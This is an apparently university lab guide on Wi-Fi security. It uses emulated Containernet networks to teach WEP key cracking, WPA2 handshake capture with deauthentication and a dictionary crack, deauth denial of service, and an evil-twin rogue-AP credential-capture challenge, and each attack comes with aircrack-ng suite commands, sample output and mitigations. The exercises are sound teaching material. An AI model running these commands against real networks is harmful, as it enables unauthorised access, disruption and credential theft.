<a name="wireless-network-security"></a>
# Wireless Network Security

<a name="cracking-wep-wi-fi-encryption"></a>
## Cracking WEP Wi-Fi Encryption

Cracking WEP Wi-Fi Encryption is an attack aimed at breaking the security key of the WEP (Wired Equivalent Privacy) protocol, which uses encryption based on the RC4 algorithm. Although created to protect wireless networks, WEP has serious flaws, such as the use of short and predictable initialization vectors (IVs) and the lack of adequate mechanisms to prevent packet replay. These vulnerabilities allow an attacker to capture a large number of packets transmitted over the network and, using specific tools, analyze the repeated IVs to derive the encryption key in a few minutes. Once the key is obtained, the attacker can access the network, intercept data, and even alter traffic. Mitigating this type of attack involves replacing WEP with more secure protocols, such as WPA2 or WPA3, and adopting strong passwords to make brute-force attacks more difficult.

For this exercise, consider running the code below and opening terminals for Alice and Bob.

```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from containernet.net import Containernet
from containernet.node import DockerSta
from containernet.cli import CLI
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    alice1 = net.addStation('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
                            volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                            environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                            passwd='123456789a', encrypt='wep', cls=DockerSta, 
                            mac='00:00:00:00:00:01')
    bob1 = net.addStation('bob', dimage="ramonfontes/seguranca", cpu_shares=20,
                          volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                          environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                          passwd='123456789a', encrypt='wep', cls=DockerSta, 
                          mac='00:00:00:00:00:02')
    chuck1 = net.addStation('chuck', dimage="ramonfontes/seguranca", cpu_shares=20, 
                            volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                            environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                            passwd='1234567891a', encrypt='wep', cls=DockerSta, 
                            mac='00:00:00:00:00:03')
    ap1 = net.addAccessPoint('ap1', ssid="simplewifi", mode="g", channel="1",
                            passwd='123456789a', encrypt='wep',
                            failMode="standalone", datapath='user',
                            mac='00:00:00:00:00:04')   
 
    info("*** Configuring wifi nodes\n")
    net.configureWifiNodes()

    info("*** Associating Stations\n")
    net.addLink(alice1, ap1)
    net.addLink(bob1, ap1)
    net.addLink(chuck1, ap1)

    info("*** Starting network\n")
    net.build()
    ap1.start([])

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

**Note**: You may need to stop the network-manager service for Wi-Fi-reliant code to work. You can confirm whether this is necessary by running a network scan from any client (e.g., alice). If Alice is not connected to the AP and a scan (e.g., iw dev alice-wlan0 scan) failed to identify AP1, you'll need to stop network-manager (e.g., sudo service network-manager stop) before running the code. Be careful, stopping network-manager may interrupt your connection to your router. Therefore, you may want to start network-manager (e.g., sudo service network-manager start) after completing the activity.

After running the code, create a monitor-type interface for Chuck, as shown below.

```
chuck# iw dev chuck-wlan0 interface add mon0 type monitor
chuck# ifconfig mon0 up
```

Next, we'll begin using airodump to capture packets from other wireless devices, allowing the software to perform calculations and comparisons between the data to break the insecure WEP protocol. To do so, enter the following command in Chuck's terminal:

```
chuck# airodump-ng mon0
```

and observe the output.

Now, it's time to instruct the wireless interface to start storing captured wireless data based on the network of choice. Remember to incorporate three important pieces of information from the previous output with the following command:

```
chuck# airodump-ng -w simplewifi -c 1 --bssid 00:00:00:00:00:04 mon0
```
and observe the output.

**Note**: Here you need to generate some traffic between Alice and Bob. It is recommended to use iperf.

Last but not least, you'll need to perform the most important step of the process using the data captured from the WEP device. To do so, issue the following command:

```
chuck# aircrack-ng simplewifi-01.cap
```

If everything goes as planned, you'll be able to crack the WEP system. However, if the command fails, you'll have to wait for the wireless card to capture more data. Wait until it captures 15,000 packets and try again.


<a name="dictionary-attack"></a>
## Dictionary Attack


A dictionary attack is a method used to discover passwords or access keys by systematically trying previously known combinations stored in a file called a "dictionary." Unlike a brute-force attack, which tests all possible combinations, a dictionary attack is limited to words, phrases, variations, and common patterns used by users, making it faster and more efficient in many cases. This type of attack exploits people's habit of choosing simple or predictable passwords, such as names, dates, or popular terms. Automated tools perform these attempts quickly, and if the password is present in the dictionary, access is gained. Prevention involves using long, complex, and unique passwords that combine uppercase and lowercase letters, numbers, and special characters, as well as implementing mechanisms such as temporary lockout after multiple attempts and multifactor authentication to reduce the risk of compromise.

For this exercise, consider running the code below and opening terminals for Alice and Chuck.

```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from containernet.net import Containernet
from containernet.node import DockerSta
from containernet.cli import CLI
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    ap1 = net.addAccessPoint('ap1', ssid="simplewifi", mode="g", channel="1",
                             passwd='123456789a', encrypt='wpa2',
                             failMode="standalone", datapath='user',
                             mac='02:00:00:00:02:00')
    alice1 = net.addStation('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
                            volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                            environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                            passwd='123456789a', encrypt='wpa2', cls=DockerSta, 
                            mac='02:00:00:00:02:01')
    chuck1 = net.addStation('chuck', dimage="ramonfontes/seguranca", cpu_shares=20, 
                            volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                            environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                            passwd='1234567890a', encrypt='wpa2', cls=DockerSta, 
                            mac='02:00:00:00:02:02')
    
    info("*** Configuring wifi nodes\n")
    net.configureWifiNodes()

    info("*** Associating Stations\n")
    net.addLink(alice1, ap1)
    net.addLink(chuck1, ap1)

    info("*** Starting network\n")
    net.build()
    ap1.start([])

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

Running the above code should automatically connect Alice to AP1, while Chuck, lacking knowledge of the correct WPA key, should not connect. However, since Chuck wants to perform a dictionary attack, he must perform a few steps.

The first involves creating the monitor interface.

```
chuck# airmon-ng start chuck-wlan0
```

It will then use airodump-ng to capture beacons on the newly created network interface:

```
chuck# airodump-ng chuck-wlan0mon
```

Running the airodump will be useful for identifying Alice's MAC address and the BSSID of the AP to which Alice is connected. The SSID can serve as a backup.

Once you've identified Alice's BSSID and MAC, stop the airodump and drop Alice's connection so Chuck can capture the 4-way handshake:

```
chuck# iwconfig chuck-wlan0mon channel 1
chuck# aireplay-ng -0 100 -a 02:00:00:00:02:00 -c 02:00:00:00:02:01 chuck-wlan0mon --ignore-negative-one
```

And in a new Chuck terminal, start saving capture data to a capture file named <my-capture>.

```
chuck# airodump-ng --bssid 02:00:00:00:02:00 chuck-wlan0mon -w my-capture
```

Now, stop the aireplay attack and create a file called file.psk containing the following content:

```
123456789a
abcdefgh
0011223344
```


Then stop airodump and run the command below:

```
chuck# aircrack-ng -w arquivo.psk -b 02:00:00:00:02:00 my-capture-01.cap 
```


And voila! Password has been discovered!
```
Aircrack-ng 1.6

      [00:00:00] 3/3 keys tested (63.70 k/s)

      Time left: --

                          KEY FOUND! [ 123456789a ]


      Master Key     : E0 3D DC 8E 51 FB 0A 35 A6 EE 6D DF 9B 6B 69 EB
                       E8 C0 7B D2 50 95 63 A7 26 43 DD B2 0F 46 E6 21

      Transient Key  : 55 6C 6D AA 5D B2 DC E6 C3 FB 38 59 C8 B4 5D B3
                       1E 3B AB 48 81 8E 94 AB 50 94 9E 25 61 8D D4 F0
                       B9 1E 4F 3C 9C 84 48 3D 8B 09 86 1D 98 31 23 57
                       4B 03 8F B4 86 8F 8D A4 59 CD 30 2D 71 D7 AF 18

  EAPOL HMAC     : C1 3D 58 9D 02 CB 03 4A FC 3D 44 96 FF 2D 5D 79
```


<a name="ieee-80211x-authentication"></a>
## IEEE 80211x Authentication

IEEE 802.11x authentication can be performed by following the instructions here. 802.11x authentication is optional and, according to the instructions, will not be performed using the containers available in this material. Although this item is not incorporated into the containers, your instructor recommends reproducing it so you understand how this authentication method can be configured.

<a name="deauthentication-attack"></a>
## Deauthentication Attack

A deauthentication attack is an active attack on Wi-Fi networks based on the exploitation of IEEE 802.11 protocol management frames, which are not cryptographically protected. In this attack, the attacker sends fake deauthentication frames to the client or access point, pretending to be the legitimate source. As a result, the client is forced to disconnect and initiate a new authentication process. This type of attack can be used both to cause a denial of service, preventing devices from accessing the network, and as an auxiliary step in more advanced attacks, such as capturing the WPA/WPA2 handshake, necessary for password cracking attempts.

In practice, a deauthentication attack is carried out by exploiting the fact that deauth and disassociation management frames on Wi-Fi networks are generally not protected by encryption (except in newer networks that use 802.11w – Protected Management Frames). The attacker, in monitor mode with a compatible network card, can capture network packets and then inject spoofed deauthentication frames to force clients to disconnect. Widely used tools in this context are aireplay-ng (from the Aircrack-ng package), which allows sending targeted deauthentication packets to specific or all clients on a network, and mdk4, which automates deauthentication attacks and other variations of management attacks.

The basic attack flow is as follows:
- The attacker puts the Wi-Fi interface in monitor mode.
- He identifies the access point (BSSID) and connected clients.
- He then send spoofed deauthentication packets, impersonating the access point or client.
- The target device disconnects and often reconnects immediately, which can be exploited to capture the WPA/WPA2 handshake. 

This attack is simple but very effective on networks without management frame protection, and can be used both for denial of service and as a preparatory step for password cracking attacks.

For this exercise, consider running the code below and open terminals for Alice and Chuck.

```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from containernet.net import Containernet
from containernet.node import DockerSta
from containernet.cli import CLI
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    ap1 = net.addAccessPoint('ap1', ssid="simplewifi", mode="g", channel="1",
                             passwd='123456789a', encrypt='wpa2',
                             failMode="standalone", datapath='user',
                             mac='02:00:00:00:02:00')
    alice1 = net.addStation('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
                            volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                            environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                            passwd='123456789a', encrypt='wpa2', cls=DockerSta, 
                            mac='02:00:00:00:02:01')
    chuck1 = net.addStation('chuck', dimage="ramonfontes/seguranca", cpu_shares=20, 
                            volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                            environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                            cls=DockerSta, mac='02:00:00:00:02:02')
    
    info("*** Configuring wifi nodes\n")
    net.configureWifiNodes()

    info("*** Associating Stations\n")
    net.addLink(alice1, ap1)
    net.addLink(chuck1, ap1)

    info("*** Starting network\n")
    net.build()
    ap1.start([])

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

Then perform the deauthentication attack from chuck as follows:

```
chuck# aireplay-ng -0 0 -a 02:00:00:00:02:00 -c 02:00:00:00:02:01 chuck-wlan0
```

And check if Alice is connected to the access point:
```
chuck# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

alice-wlan0  IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
```

As you can see, Alice is no longer connected to the access point, indicating that the attack was successful.

<a name="evil-twin-attack"></a>
## Evil-twin Attack

An Evil Twin Attack involves creating a fake access point with the same network name (SSID) as the legitimate AP, often emitting a stronger signal to attract automatic user connections. Once connected, the attacker can capture credentials, inject malicious content, or redirect the victim to fake pages (phishing). The consequences include theft of passwords and sensitive information, data interception through sniffing techniques, and even the distribution of malware. To prevent this, it is recommended to manually verify the access point before connecting, use a VPN to encrypt traffic, enable strong authentication such as WPA3, and monitor the network with rogue AP detection tools.

### Challenge: Evil Twin Attack

Attack Script: Attacker Chuck has access to all network information on the victim access point AP1 (including the password). Therefore, a client victim, Alice, is chosen, and Chuck must disable this victim's connection to AP1. The page the victim will access when connecting to AP2 is a fictitious page with a form that can be used to capture Alice's information. Use the code below as a reference. Don't forget to answer how this attack can be prevented.

Consider the following additional information:
- The code already starts the web server on AP2.
- In a well-configured environment, it would not be necessary to define port 80. Any website would be redirected to the page shown above, even if it were an HTTPS page. Here, make sure, at the very least, that the file in AP2, located at /var/www/html/dbconnect.php, has the value set for the $host variable to the same IP as AP2's eth0 port. Otherwise, you will need to make modifications for the MySQL server to function properly.
- Database user: rogueuser Rogueuser password: roguepassword Database name: rogueap
- Data entered by Alice can be checked on AP2 using the mysql> select * from wpa_keys command.
- An AP on AP2 must be created using hostapd.
- Chuck will connect to AP2 using wpa_supplicant.


```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from containernet.net import Containernet
from containernet.node import DockerSta
from containernet.cli import CLI
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    ap1 = net.addAccessPoint('ap1', ssid="simplewifi", mode="g", channel="1",
                             passwd='123456789a', encrypt='wpa2',
                             failMode="standalone", datapath='user',
                             mac='00:00:00:00:00:01')
    ap2 = net.addStation('ap2', cls=DockerSta, dimage="ramonfontes/rogue-ap", cpu_shares=20,
                         mac='00:00:00:00:00:02')
    alice1 = net.addStation('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
                            volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                            environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                            passwd='123456789a', encrypt='wpa2', cls=DockerSta, 
                            mac='00:00:00:00:00:03', ip='10.200.0.2/24')
    chuck1 = net.addStation('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                            volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                            environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                            passwd='123456789a', encrypt='wpa2', cls=DockerSta, 
                            mac='00:00:00:00:00:04', ip='10.200.0.3/24')
    
    info("*** Configuring wifi nodes\n")
    net.configureWifiNodes()

    info("*** Associating Stations\n")
    net.addLink(alice1, ap1)

    info("*** Starting network\n")
    net.build()
    ap1.start([])

    ap1.cmd("ifconfig ap1-wlan1 up 10.200.0.10 netmask 255.255.255.0")
    ap2.cmd("ifconfig ap2-wlan0 up 10.200.0.1 netmask 255.255.255.0")
    ap2.cmd("echo \'10.200.0.1 ap2\' > /etc/hosts")
    ap2.cmd("service apache2 start")
    ap2.cmd("service mysql start")

    alice1.cmd('route add default gw 10.200.0.1') 
    chuck1.cmd('route add default gw 10.200.0.1')    

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```


## References

- Berghel, Hal, and Jacob Uecker. "WiFi attack vectors." Communications of the ACM 48.8 (2005): 21-28.
- Yacchirena, Ana, et al. "Analysis of attack and protection systems in Wi-Fi wireless networks under the Linux operating system." 2016 IEEE International Conference on Automatica (ICA-ACCA). IEEE, 2016.
- Agarwal, Mayank, Santosh Biswas, and Sukumar Nandi. "An efficient scheme to detect evil twin rogue access point attack in 802.11 Wi-Fi networks." International Journal of Wireless Information Networks 25.2 (2018): 130-145.


